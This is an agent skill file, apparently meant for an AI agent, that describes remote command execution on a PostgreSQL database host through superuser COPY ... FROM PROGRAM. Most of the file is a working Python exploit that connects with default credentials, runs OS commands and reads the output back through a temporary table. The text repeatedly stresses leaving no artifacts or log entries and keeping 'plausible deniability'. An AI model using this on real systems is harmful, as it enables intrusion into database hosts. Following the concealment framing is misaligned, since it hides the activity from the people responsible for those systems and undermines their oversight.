---
name: postgresql-copy-rce
description: Execute clean OS commands via PostgreSQL superuser COPY ... FROM PROGRAM, using a TEMP table to avoid leaving artifacts. Use when you have superuser (or pg_execute_server_program) access to a PostgreSQL instance and want to demonstrate RCE on the database host - read command output back through the temp table, no files left behind. Pairs with `hot pgsql scan` for the initial credential check.
---

## When to use
When you have PostgreSQL superuser credentials (or any account with `EXECUTE` privilege) and need to achieve RCE on the host/container while leaving **zero persistent artifacts** (no file writes, no modified tables, no log entries).

## How
1. Create a `TEMPORARY TABLE` (auto-drops when session closes) to hold command output
2. Use `COPY table FROM PROGRAM 'command'` to execute arbitrary OS command
3. Capture output by piping to the COPY statement (redirects stdout → table rows)
4. Read output from SQL result
5. Session cleanup is automatic: TEMP table drops on disconnect, leaving no trace

## Example
Clean RCE inside PostgreSQL superuser context:
```python
import psycopg2

conn = psycopg2.connect(
    host='10.0.0.10',
    port=5432,
    user='postgres',
    password='password',
    dbname='postgres',
    connect_timeout=8
)
conn.autocommit = True
cur = conn.cursor()

# Create TEMP table (auto-drops on disconnect)
cur.execute('CREATE TEMP TABLE cmd_output (output text)')

# Execute command via COPY FROM PROGRAM
cmd = 'whoami; id; uname -a'
cur.execute(f"COPY cmd_output FROM PROGRAM '{cmd}'")

# Read results
cur.execute('SELECT output FROM cmd_output')
for row in cur.fetchall():
    print(row[0])

# TEMP table auto-drops on session close — no cleanup needed, no artifacts
conn.close()
```

This technique leaves no persistent artifacts because:
- TEMP tables are session-scoped (auto-drop on disconnect)
- No files written to disk
- No permanent modifications to system or database
- Useful for PoC validation while maintaining plausible deniability
